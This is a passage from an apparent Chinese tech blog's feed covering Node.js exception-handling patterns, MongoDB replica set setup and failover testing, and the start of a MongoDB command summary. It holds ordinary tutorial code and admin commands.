class="comment">// 触发 error事件</span></span><br><span class="line">emitter.<span class="title function_">emit</span>(<span class="string">&#x27;error&#x27;</span>, <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;你代码出错了&#x27;</span>));</span><br></pre></td></tr></table></figure><p>执行效果如下图所示：</p><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/561794-20190325231650303-1807839302.png" alt="561794-20190325231650303-1807839302"></p><p><strong>2.3 callback的方式</strong></p><p>比如读取一个文件，或者创建一个目录，测试代码如下：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"></span><br><span class="line">fs.<span class="title function_">mkdir</span>(<span class="string">&#x27;/dir&#x27;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (e) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;异常信息处理&#x27;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;创建目录成功&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>然后执行结果如下图所示：</p><p><img src="/Nodejs%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E6%96%B9%E5%BC%8F/561794-20190325231727972-2095299768.png" alt="561794-20190325231727972-2095299768"></p><h2 id="3-Promise方式"><a href="#3-Promise方式" class="headerlink" title="3.Promise方式"></a><strong>3.Promise方式</strong></h2><figure class="highlight coffeescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">(resolve, reject)</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;).<span class="keyword">then</span>(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="regexp">//</span> 。。。。</span><br><span class="line">&#125;).<span class="keyword">catch</span>(<span class="function"><span class="params">(e)</span> =&gt;</span> &#123;</span><br><span class="line">  console.log(<span class="string">&#x27;能进来说明可以处理异常信息了&#x27;</span>);</span><br><span class="line">  console.log(e);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>执行结果如下图所示：</p><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/561794-20190325231800997-1387265798.png" alt="561794-20190325231800997-1387265798"></p><p>如上是处理同步代码，但是如果是异步代码呢？继续如下代码测试：</p><figure class="highlight coffeescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">(resolve, reject)</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">  &#125;, <span class="number">100</span>);</span><br><span class="line">&#125;).<span class="keyword">then</span>(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="regexp">//</span> 。。。。</span><br><span class="line">&#125;).<span class="keyword">catch</span>(<span class="function"><span class="params">(e)</span> =&gt;</span> &#123;</span><br><span class="line">  console.log(<span class="string">&#x27;能进来说明可以处理异常信息了&#x27;</span>);</span><br><span class="line">  console.log(e);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>然后执行结果如下所示：</p><p><img src="/Nodejs%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E6%96%B9%E5%BC%8F/561794-20190325231831471-2125390414.png" alt="561794-20190325231831471-2125390414"></p><p>可以看到，Promise也是一样无法捕获异步代码中的异常信息了。</p><h2 id="4-Async-Await-方式"><a href="#4-Async-Await-方式" class="headerlink" title="4.Async/Await 方式"></a><strong>4.Async/Await 方式</strong></h2><p>Async/Await 也是基于Promise的，Promise是无法捕获异步异常，因此Async/Await 也是没有办法捕获的。如下测试代码：</p><p>先看同步代码可以捕获到的，代码如下：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> testFunc = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">testAsync</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">await</span> <span class="title function_">testFunc</span>();</span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;能进来，说明异常能处理&#x27;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">testAsync</span>();</span><br></pre></td></tr></table></figure><p>执行结果如下所示：</p><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/561794-20190325231912878-714948440.png" alt="561794-20190325231912878-714948440"></p><p>我们再看异步代码，如下所示：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> testFunc = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">1111</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;, <span class="number">100</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">testAsync</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">await</span> <span class="title function_">testFunc</span>();</span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;能进来，说明异常能处理&#x27;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">testAsync</span>();</span><br></pre></td></tr></table></figure><p>如下图所示：</p><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/561794-20190325231942744-382555430.png" alt="561794-20190325231942744-382555430"></p><h2 id="5-process方式-该方式既可以处理同步代码的异常，也可以处理异步代码的异常-。"><a href="#5-process方式-该方式既可以处理同步代码的异常，也可以处理异步代码的异常-。" class="headerlink" title="5.process方式(该方式既可以处理同步代码的异常，也可以处理异步代码的异常)。"></a><strong>5.process方式(该方式既可以处理同步代码的异常，也可以处理异步代码的异常)。</strong></h2><p>如下同步代码异常：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">process.<span class="title function_">on</span>(<span class="string">&#x27;uncaughtException&#x27;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;我能进来，说明可以处理异常&#x27;</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">testFunc</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">testFunc</span>();</span><br></pre></td></tr></table></figure><p>执行结果如下所示：</p><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/561794-20190325232019749-1652359803.png" alt="561794-20190325232019749-1652359803"></p><p>异步代码如下所示：</p><figure class="highlight coffeescript"><table><tr><td class="code"><pre><span class="line">process.<span class="literal">on</span>(<span class="string">&#x27;uncaughtException&#x27;</span>, <span class="function"><span class="params">(e)</span> =&gt;</span> &#123;</span><br><span class="line">  console.log(<span class="string">&#x27;我能进来，说明可以处理异常&#x27;</span>);</span><br><span class="line">  console.log(e);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">function testFunc() &#123;</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">  &#125;, <span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">testFunc();</span><br></pre></td></tr></table></figure><p>如下图所示：</p><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/561794-20190325232050213-1983149986.png" alt="561794-20190325232050213-1983149986"></p><h2 id="6-domain方式"><a href="#6-domain方式" class="headerlink" title="6.domain方式"></a><strong>6.domain方式</strong></h2><p><strong>domain也可以处理任何类型异常的信息，包含同步和异步。</strong></p><p>如下同步代码所示：</p><figure class="highlight coffeescript"><table><tr><td class="code"><pre><span class="line">const domain = <span class="built_in">require</span>(<span class="string">&#x27;domain&#x27;</span>);</span><br><span class="line">const d = domain.create();</span><br><span class="line"></span><br><span class="line">d.<span class="literal">on</span>(<span class="string">&#x27;error&#x27;</span>, <span class="function"><span class="params">(e)</span> =&gt;</span> &#123;</span><br><span class="line">  console.log(<span class="string">&#x27;我能进来，说明能处理异常&#x27;</span>);</span><br><span class="line">  console.log(e);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">d.run(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;同步代码处理&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>如下图所示：</p><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/561794-20190325232130654-246536331.png" alt="561794-20190325232130654-246536331"></p><p>异步代码如下所示：</p><figure class="highlight coffeescript"><table><tr><td class="code"><pre><span class="line">const domain = <span class="built_in">require</span>(<span class="string">&#x27;domain&#x27;</span>);</span><br><span class="line">const d = domain.create();</span><br><span class="line"></span><br><span class="line">d.<span class="literal">on</span>(<span class="string">&#x27;error&#x27;</span>, <span class="function"><span class="params">(e)</span> =&gt;</span> &#123;</span><br><span class="line">  console.log(<span class="string">&#x27;我能进来，说明能处理异常&#x27;</span>);</span><br><span class="line">  console.log(e);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">d.run(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;异步代码处理&#x27;</span>);</span><br><span class="line">  &#125;, <span class="number">100</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>如下图所示：</p><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/561794-20190325232200670-1523570411.png" alt="561794-20190325232200670-1523570411"></p>]]></content>
    
    
    <summary type="html">介绍Node.js中常用的异常处理方式</summary>
    
    
    
    <category term="Linux" scheme="https://www.scery.com/categories/Linux/"/>
    
    <category term="Nodejs" scheme="https://www.scery.com/categories/Linux/Nodejs/"/>
    
    <category term="异常处理" scheme="https://www.scery.com/categories/Linux/Nodejs/%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/"/>
    
    
    <category term="Linux" scheme="https://www.scery.com/tags/Linux/"/>
    
    <category term="Nodejs" scheme="https://www.scery.com/tags/Nodejs/"/>
    
    <category term="异常处理" scheme="https://www.scery.com/tags/%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>MongoDB集群-副本集</title>
    <link href="https://www.scery.com/MongoDB%E9%9B%86%E7%BE%A4-%E5%89%AF%E6%9C%AC%E9%9B%86.htm"/>
    <id>https://www.scery.com/MongoDB%E9%9B%86%E7%BE%A4-%E5%89%AF%E6%9C%AC%E9%9B%86.htm</id>
    <published>2020-07-30T13:43:04.000Z</published>
    <updated>2024-03-18T02:51:00.712Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MongoDB副本集"><a href="#MongoDB副本集" class="headerlink" title="MongoDB副本集"></a>MongoDB副本集</h1><h3 id="1-介绍"><a href="#1-介绍" class="headerlink" title="1.介绍"></a>1.介绍</h3><p>MongoDB 副本集（Replica Set）是有自动故障恢复功能的主从集群，有一个Primary节点和一个或多个Secondary节点组成。类似于MySQL的MMM架构。更多关于副本集的介绍请见<a href="https://docs.mongodb.com/manual/replication/">官网</a>。</p><h3 id="2-原理"><a href="#2-原理" class="headerlink" title="2.原理"></a>2.原理</h3><p>副本集中数据同步过程：Primary节点写入数据，Secondary通过读取Primary的oplog得到复制信息，开始复制数据并且将复制信息写入到自己的oplog。如果某个操作失败，则备份节点停止从当前数据源复制数据。如果某个备份节点由于某些原因挂掉了，当重新启动后，就会自动从oplog的最后一个操作开始同步，同步完成后，将信息写入自己的oplog，由于复制操作是先复制数据，复制完成后再写入oplog，有可能相同的操作会同步两份，不过MongoDB在设计之初就考虑到这个问题，将oplog的同一个操作执行多次，与执行一次的效果是一样的。简单的说就是：</p><p>当Primary节点完成数据操作后，Secondary会做出一系列的动作保证数据的同步</p><ul><li>检查自己local库的oplog.rs集合找出最近的时间戳。</li><li>检查Primary节点local库oplog.rs集合，找出大于此时间戳的记录。</li><li>将找到的记录插入到自己的oplog.rs集合中，并执行这些操作。</li></ul><p>副本集的同步和主从同步一样，都是异步同步的过程，不同的是副本集有个自动故障转移的功能。其原理是：slave端从primary端获取日志，然后在自己身上完全顺序的执行日志所记录的各种操作（该日志是不记录查询操作的），这个日志就是local数据 库中的oplog.rs表，默认在64位机器上这个表是比较大的，占磁盘大小的5%，oplog.rs的大小可以在启动参数中设 定：–oplogSize 1000,单位是M。</p><blockquote><p>注意：在副本集的环境中，要是所有的Secondary都宕机了，只剩下Primary。最后Primary会变成Secondary，不能提供服务。</p></blockquote><h4 id="2-1自动切换"><a href="#2-1自动切换" class="headerlink" title="2.1自动切换"></a>2.1自动切换</h4><h5 id="集群开始如下："><a href="#集群开始如下：" class="headerlink" title="集群开始如下："></a>集群开始如下：</h5><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/image-20200730214916761.png" alt="image-20200730214916761"></p><h5 id="primary挂了以后"><a href="#primary挂了以后" class="headerlink" title="primary挂了以后:"></a>primary挂了以后:</h5><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/image-20200730215028695.png" alt="image-20200730215028695"></p><h3 id="3-环境搭建"><a href="#3-环境搭建" class="headerlink" title="3.环境搭建"></a>3.环境搭建</h3><h4 id="3-1环境准备"><a href="#3-1环境准备" class="headerlink" title="3.1环境准备"></a>3.1环境准备</h4><table><thead><tr><th>IP</th><th>主机名</th><th>系统</th><th>安装软件</th></tr></thead><tbody><tr><td>10.0.0.100</td><td>Server1</td><td>centos7</td><td>mongodb</td></tr><tr><td>10.0.0.101</td><td>Server2</td><td>centos7</td><td>mongodb</td></tr><tr><td>10.0.0.102</td><td>Server3</td><td>centos7</td><td>mongodb</td></tr></tbody></table><p>安装过程就忽略了。。。。</p><p>在每个服务器的mongodb配置文件加上：</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">//y</span>aml格式</span><br><span class="line">replication:</span><br><span class="line">  replSetName: repset</span><br><span class="line"><span class="regexp">//</span>如果是普通格式化</span><br><span class="line">replSet=anthony</span><br></pre></td></tr></table></figure><blockquote><p>mongod的配置文件，有yaml格式也有普通的=格式。</p><p>yaml格式的参考 <a href="https://docs.mongodb.com/manual/reference/configuration-options/#replication.replSetNam">https://docs.mongodb.com/manual/reference/configuration-options/#replication.replSetNam</a></p></blockquote><h3 id="4-初始化配置复制集"><a href="#4-初始化配置复制集" class="headerlink" title="4.初始化配置复制集"></a>4.初始化配置复制集</h3><h4 id="4-1-在主服务器创建复制集"><a href="#4-1-在主服务器创建复制集" class="headerlink" title="4.1 在主服务器创建复制集"></a>4.1 在主服务器创建复制集</h4><p>我们先配置包含两个节点的复制集，多出来的一个节点，会在接下来再做一个节点添加的操作</p><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">mongo</span></span><br><span class="line"><span class="attribute">server</span>=&#123;<span class="string">&quot;_id&quot;</span>:<span class="string">&quot;anthony&quot;</span>,<span class="string">&quot;members&quot;</span>:[&#123;<span class="string">&quot;_id&quot;</span>:<span class="number">0</span>,<span class="string">&quot;host&quot;</span>:<span class="string">&quot;10.0.0.101:27017&quot;</span>&#125;,&#123;<span class="string">&quot;_id&quot;</span>:<span class="number">1</span>,<span class="string">&quot;host&quot;</span>:<span class="string">&quot;10.0.0.102:27017&quot;</span>&#125;]&#125;</span><br></pre></td></tr></table></figure><h4 id="4-2-初始化复制集"><a href="#4-2-初始化复制集" class="headerlink" title="4.2 初始化复制集"></a>4.2 初始化复制集</h4><p>在初始化复制集时，要确保从节点没有数据，不然在初始化以后会造成从节点服务器的数据丢失。</p><figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line">rs.initiate(<span class="keyword">server</span>)</span><br></pre></td></tr></table></figure><h4 id="4-3-查看复制集中各节点状态"><a href="#4-3-查看复制集中各节点状态" class="headerlink" title="4.3 查看复制集中各节点状态"></a>4.3 查看复制集中各节点状态</h4><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">anthony:SECONDARY&gt; rs.status()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;set&quot;</span> : <span class="string">&quot;anthony&quot;</span>,</span><br><span class="line">    <span class="string">&quot;date&quot;</span> : ISODate(<span class="string">&quot;2020-07-14T14:40:20.756Z&quot;</span>),</span><br><span class="line">         ···     <span class="regexp">//</span>省略部分内容</span><br><span class="line">    <span class="string">&quot;members&quot;</span> : [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;_id&quot;</span> : <span class="number">0</span>,</span><br><span class="line">            <span class="string">&quot;name&quot;</span> : <span class="string">&quot;10.0.0.100:27017&quot;</span>,</span><br><span class="line">            <span class="string">&quot;health&quot;</span> : <span class="number">1</span>,             <span class="regexp">//</span>健康值为<span class="number">1</span>，代表该节点处于运行良好状态</span><br><span class="line">            <span class="string">&quot;state&quot;</span> : <span class="number">1</span>,               <span class="regexp">//</span><span class="number">1</span>代表主</span><br><span class="line">            <span class="string">&quot;stateStr&quot;</span> : <span class="string">&quot;PRIMARY&quot;</span>,   <span class="regexp">//</span>处于peimary状态</span><br><span class="line">         ···     <span class="regexp">//</span>省略部分内容</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;_id&quot;</span> : <span class="number">1</span>,</span><br><span class="line">            <span class="string">&quot;name&quot;</span> : <span class="string">&quot;10.0.0.101:27017&quot;</span>,</span><br><span class="line">            <span class="string">&quot;health&quot;</span> : <span class="number">1</span>,</span><br><span class="line">            <span class="string">&quot;state&quot;</span> : <span class="number">2</span>,              <span class="regexp">//</span><span class="number">2</span>代表从</span><br><span class="line">            <span class="string">&quot;stateStr&quot;</span> : <span class="string">&quot;SECONDARY&quot;</span>, <span class="regexp">//</span>处于secondary状态</span><br><span class="line">        ···     <span class="regexp">//</span>省略部分内容</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;_id&quot;</span> : <span class="number">2</span>,</span><br><span class="line">            <span class="string">&quot;name&quot;</span> : <span class="string">&quot;10.0.0.102:27017&quot;</span>,</span><br><span class="line">            <span class="string">&quot;health&quot;</span> : <span class="number">1</span>,</span><br><span class="line">            <span class="string">&quot;state&quot;</span> : <span class="number">2</span>,</span><br><span class="line">            <span class="string">&quot;stateStr&quot;</span> : <span class="string">&quot;SECONDARY&quot;</span>,</span><br><span class="line">        ···     <span class="regexp">//</span>省略部分内容</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">anthony:PRIMARY&gt;            <span class="regexp">//</span>此时节点状态已经发生转变</span><br></pre></td></tr></table></figure><h3 id="5-节点管理-在primary上做"><a href="#5-节点管理-在primary上做" class="headerlink" title="5.节点管理(在primary上做)"></a>5.节点管理(在primary上做)</h3><h4 id="1-添加节点"><a href="#1-添加节点" class="headerlink" title="1. 添加节点"></a>1. 添加节点</h4><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">rs.<span class="built_in">add</span>(<span class="string">&quot;10.0.0.103:27017&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="2-删除节点"><a href="#2-删除节点" class="headerlink" title="2. 删除节点"></a>2. 删除节点</h4><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">rs.<span class="built_in">remove</span>(<span class="string">&quot;10.0.0.103:27017&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="6-故障转移切换"><a href="#6-故障转移切换" class="headerlink" title="6.故障转移切换"></a>6.故障转移切换</h3><h4 id="1-模拟主节点损坏"><a href="#1-模拟主节点损坏" class="headerlink" title="1. 模拟主节点损坏"></a>1. 模拟主节点损坏</h4><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">ps aux | grep  mongod     <span class="regexp">//</span>查询本地的节点的进程号</span><br><span class="line">kill -<span class="number">9</span> <span class="number">40882</span>             <span class="regexp">//</span>杀死主节点进程</span><br></pre></td></tr></table></figure><h4 id="2-查看节点状态"><a href="#2-查看节点状态" class="headerlink" title="2. 查看节点状态"></a>2. 查看节点状态</h4><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">anthony:SECONDARY&gt; rs.status()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;set&quot;</span> : <span class="string">&quot;anthony&quot;</span>,</span><br><span class="line">    <span class="string">&quot;date&quot;</span> : ISODate(<span class="string">&quot;2020-07-14T15:21:21.426Z&quot;</span>),</span><br><span class="line">    <span class="string">&quot;myState&quot;</span> : <span class="number">2</span>,</span><br><span class="line">    <span class="string">&quot;term&quot;</span> : NumberLong(<span class="number">2</span>),</span><br><span class="line">    <span class="string">&quot;syncingTo&quot;</span> : <span class="string">&quot;10.0.0.102:27017&quot;</span>,</span><br><span class="line">    <span class="string">&quot;syncSourceHost&quot;</span> : <span class="string">&quot;10.0.0.102:27017&quot;</span>,</span><br><span class="line">    <span class="string">&quot;syncSourceId&quot;</span> : <span class="number">2</span>,</span><br><span class="line">           ···   <span class="regexp">//</span>省略部分内容</span><br><span class="line">    <span class="string">&quot;members&quot;</span> : [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;_id&quot;</span> : <span class="number">0</span>,</span><br><span class="line">            <span class="string">&quot;name&quot;</span> : <span class="string">&quot;10.0.0.100:27017&quot;</span>,</span><br><span class="line">            <span class="string">&quot;health&quot;</span> : <span class="number">0</span>,             <span class="regexp">//</span>健康值为<span class="number">0</span>，处于停机状态</span><br><span class="line">            <span class="string">&quot;state&quot;</span> : <span class="number">8</span>,</span><br><span class="line">            <span class="string">&quot;stateStr&quot;</span> : <span class="string">&quot;(not reachable/healthy)&quot;</span>,</span><br><span class="line">           ···   <span class="regexp">//</span>省略部分内容</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;_id&quot;</span> : <span class="number">1</span>,</span><br><span class="line">            <span class="string">&quot;name&quot;</span> : <span class="string">&quot;10.0.0.101:27017&quot;</span>,</span><br><span class="line">            <span class="string">&quot;health&quot;</span> : <span class="number">1</span>,</span><br><span class="line">            <span class="string">&quot;state&quot;</span> : <span class="number">2</span>,</span><br><span class="line">            <span class="string">&quot;stateStr&quot;</span> : <span class="string">&quot;SECONDARY&quot;</span>,</span><br><span class="line">            ···   <span class="regexp">//</span>省略部分内容</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;_id&quot;</span> : <span class="number">2</span>,</span><br><span class="line">            <span class="string">&quot;name&quot;</span> : <span class="string">&quot;10.0.0.102:27017&quot;</span>,</span><br><span class="line">            <span class="string">&quot;health&quot;</span> : <span class="number">1</span>,</span><br><span class="line">            <span class="string">&quot;state&quot;</span> : <span class="number">1</span>,</span><br><span class="line">            <span class="string">&quot;stateStr&quot;</span> : <span class="string">&quot;PRIMARY&quot;</span>,</span><br><span class="line">            ···    <span class="regexp">//</span>省略部分内容</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="7-主动切换主从状态-在primary上做"><a href="#7-主动切换主从状态-在primary上做" class="headerlink" title="7.主动切换主从状态(在primary上做)"></a>7.主动切换主从状态(在primary上做)</h3><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">rs.<span class="keyword">freeze</span>(<span class="number">30</span>)      //暂停<span class="number">30</span>s不参与选举</span><br><span class="line">rs.stepDown(<span class="number">60</span>,<span class="number">30</span>)   //交出主节点位置，维持从节点状态不少于<span class="number">60</span>秒，等待<span class="number">30</span>秒使主节点和从节点日志同步</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">Mongodb集群入门——副本集，主要功能故障转移</summary>
    
    
    
    <category term="Linux" scheme="https://www.scery.com/categories/Linux/"/>
    
    <category term="MongoDB" scheme="https://www.scery.com/categories/Linux/MongoDB/"/>
    
    <category term="命令" scheme="https://www.scery.com/categories/Linux/MongoDB/%E5%91%BD%E4%BB%A4/"/>
    
    <category term="高级功能" scheme="https://www.scery.com/categories/Linux/MongoDB/%E5%91%BD%E4%BB%A4/%E9%AB%98%E7%BA%A7%E5%8A%9F%E8%83%BD/"/>
    
    
    <category term="Linux" scheme="https://www.scery.com/tags/Linux/"/>
    
    <category term="Services" scheme="https://www.scery.com/tags/Services/"/>
    
    <category term="MongoDB" scheme="https://www.scery.com/tags/MongoDB/"/>
    
  </entry>
  
  <entry>
    <title>MongoDB总结</title>
    <link href="https://www.scery.com/MongoDB%E6%80%BB%E7%BB%93.htm"/>
    <id>https://www.scery.com/MongoDB%E6%80%BB%E7%BB%93.htm</id>
    <published>2020-07-29T13:50:16.000Z</published>
    <updated>2024-03-18T02:51:00.705Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MongoDB总结"><a href="#MongoDB总结" class="headerlink" title="MongoDB总结"></a>MongoDB总结</h1><h3 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h3><figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">show databases;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> databasename;</span><br><span class="line"></span><br><span class="line"><span class="keyword">db</span>.dropDatabase();</span><br><span class="line"></span><br><span class="line">show collections;</span><br><span class="line"></span><br><span class="line"><span class="keyword">db</span>.createCollection(&#x27;collectionname&#x27;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">db</span>.collectionname.<span class="keyword">drop</span>();</span><br></pre></td></tr></table></figure><h3 id="CURD"><a href="#CURD" class="headerlink" title="CURD"></a>CURD</h3><h4 id="增："><a href="#增：" class="headerlink" title="增："></a>增：</h4><p>集合存在则直接插入数据，不存在则隐式创建</p><p>collections为集合名</p><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">db<span class="selector-class">.collection</span><span class="selector-class">.insert</span>(&#123;name:<span class="string">&quot;jack&quot;</span>&#125;)<span class="comment">//单个JSON插入</span></span><br><span class="line">db<span class="selector-class">.collection</span><span class="selector-class">.insert</span>(<span class="selector-attr">[&#123;name:<span class="string">&quot;jack&quot;</span>&#125;.&#123;name:<span class="string">&quot;tom&quot;</span>&#125;]</span>)<span class="comment">//多个JSON插入</span></span><br><span class="line"><span class="function"><span class="title">for</span><span class="params">(var i =<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)</span></span>&#123;</span><br><span class="line">db<span class="selector-class">.collection</span><span class="selector-class">.insert</span>(&#123;name:<span class="string">&quot;jack&quot;</span>&#125;)</span><br><span class="line">&#125;<span class="comment">//快速插入多个数据</span></span><br></pre></td></tr></table></figure><h4 id="改"><a href="#改" class="headerlink" title="改:"></a>改:</h4><figure class="highlight xquery"><table><tr><td class="code"><pre><span class="line">db<span class="built_in">.collection</span>.<span class="keyword">update</span>(条件,新数据[,是否新增,是否修改多条数据])</span><br><span class="line">//是否新增<span class="built_in">：true</span>则为插入，默认flase为不插入</span><br><span class="line">//是否修改多条：匹配到的数据都修改，默<span 